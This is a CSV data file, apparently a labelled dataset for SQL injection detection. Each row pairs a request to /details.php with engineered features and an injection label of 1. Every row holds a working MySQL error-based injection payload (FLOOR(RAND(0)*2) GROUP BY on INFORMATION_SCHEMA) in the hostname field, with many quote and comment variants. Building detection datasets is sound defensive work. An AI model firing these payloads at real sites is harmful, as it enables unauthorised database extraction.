full_url,parsed_url,hostname,event_time,sql_keyword,params_length,request_volume,special_chars,values_to_length,injection
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"")) AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ((""anPj"" LIKE ""anPj",1681395268.118629,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6""))) AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (((""sscZ"" LIKE ""sscZ",1681395268.123577,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"" AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ""roqr"" LIKE ""roqr",1681395268.12929,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- KDGl",1681395268.13428,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)# tInf",1681395268.139087,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) OR 'uUDn'='zBLJ",1681395268.142887,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6') WHERE 4775=4775 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jtAK",1681395268.147505,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"") WHERE 2391=2391 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- HayY",1681395268.152794,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6) WHERE 6647=6647 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NlMB",1681395268.156931,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' WHERE 1725=1725 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CEGe",1681395268.161162,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"" WHERE 8510=8510 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- qago",1681395268.165629,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6 WHERE 3587=3587 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- oBcS",1681395268.169516,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6'||(SELECT 0x68537961 WHERE 3864=3864 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'",1681395268.174283,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6'||(SELECT 0x736a5856 FROM DUAL WHERE 7989=7989 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'",1681395268.178602,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6'+(SELECT 0x516a6672 WHERE 8671=8671 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))+'",1681395268.183027,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6||(SELECT 0x4855626d FROM DUAL WHERE 9443=9443 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||",1681395268.187628,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6||(SELECT 0x46414d59 WHERE 9138=9138 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||",1681395268.191587,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6+(SELECT uHKm WHERE 9092=9092 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))+",1681395268.196087,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6+(SELECT 0x4b766574 WHERE 2217=2217 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))+",1681395268.200638,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6')) AS oqqU WHERE 4480=4480 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- UTIT",1681395268.20526,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"")) AS CbBX WHERE 2885=2885 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dmhh",1681395268.209655,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6)) AS oLKa WHERE 7710=7710 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- YlJi",1681395268.214843,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6') AS Ydka WHERE 6184=6184 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- KdHs",1681395268.218886,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"") AS pTBs WHERE 6441=6441 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CDak",1681395268.223341,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6) AS cJnA WHERE 4443=4443 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- MOJe",1681395268.227562,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6` WHERE 7354=7354 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- YidF",1681395268.232015,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6`) WHERE 5765=5765 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- KPCs",1681395268.236278,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6`=`192.168.43.6` AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND `192.168.43.6`=`192.168.43.6",1681395268.240718,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6""=""192.168.43.6"" AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ""192.168.43.6""=""192.168.43.6",1681395268.244564,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6]-(SELECT 0 WHERE 8959=8959 AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))|[192.168.43.6",1681395268.249184,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' IN BOOLEAN MODE) AND (SELECT 3176 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(3176=3176,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)#",1681395268.253441,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6) OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- yEXI",1681395268.258443,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6') OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IIdk",1681395268.263012,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- hwbO",1681395268.267148,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"" OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- sCVr",1681395268.271896,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6) OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (2462=2462",1681395268.276781,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6)) OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ((2463=2463",1681395268.292714,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6))) OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (((2854=2854",1681395268.366655,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6 OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",1681395268.37115,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6') OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('KTCQ'='KTCQ",1681395268.380942,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6')) OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (('YFSz'='YFSz",1681395268.388316,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6'))) OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ((('WfsZ'='WfsZ",1681395268.394646,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'LDII'='LDII",1681395268.445202,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6') OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('alHV' LIKE 'alHV",1681395268.449776,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6')) OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (('CWkl' LIKE 'CWkl",1681395268.454631,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6'))) OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ((('Twjy' LIKE 'Twjy",1681395268.459127,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6%' OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'HILT%'='HILT",1681395268.528161,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'VhYn' LIKE 'VhYn",1681395268.532634,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"") OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (""eMHR""=""eMHR",1681395268.538047,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"")) OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ((""vDMX""=""vDMX",1681395268.54299,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6""))) OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (((""XISb""=""XISb",1681395268.60143,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"" OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ""hNJF""=""hNJF",1681395268.606514,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"") OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (""HJBR"" LIKE ""HJBR",1681395268.611526,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"")) OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ((""CNJa"" LIKE ""CNJa",1681395268.615837,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6""))) OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (((""ralK"" LIKE ""ralK",1681395268.620306,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"" OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ""wRHw"" LIKE ""wRHw",1681395268.62718,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6 OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ZMvZ",1681395268.631237,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6 OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)# mflN",1681395268.635818,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) OR 'CAZe'='sTxJ",1681395268.640711,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6') WHERE 4963=4963 OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TSUq",1681395268.644892,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"") WHERE 7679=7679 OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- KirK",1681395268.649861,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6) WHERE 7281=7281 OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Zxem",1681395268.654115,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6' WHERE 2183=2183 OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- bzhd",1681395268.659372,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6"" WHERE 1040=1040 OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- LPxz",1681395268.664154,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6 WHERE 4145=4145 OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CQUn",1681395268.668218,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6'||(SELECT 0x52504354 WHERE 8125=8125 OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'",1681395268.672873,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6'||(SELECT 0x54667a6c FROM DUAL WHERE 1126=1126 OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'",1681395268.677045,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6'+(SELECT 0x6d6d716c WHERE 4283=4283 OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))+'",1681395268.681648,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6||(SELECT 0x704b6942 FROM DUAL WHERE 1492=1492 OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||",1681395268.68612,0,2,0.1,0,0.0,1
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,"192.168.43.6||(SELECT 0x78445054 WHERE 8548=8548 OR (SELECT 9194 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(9194=9194,1))),0x717a626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||",1681395268.69045,0,2,0.1,0,0.0,1
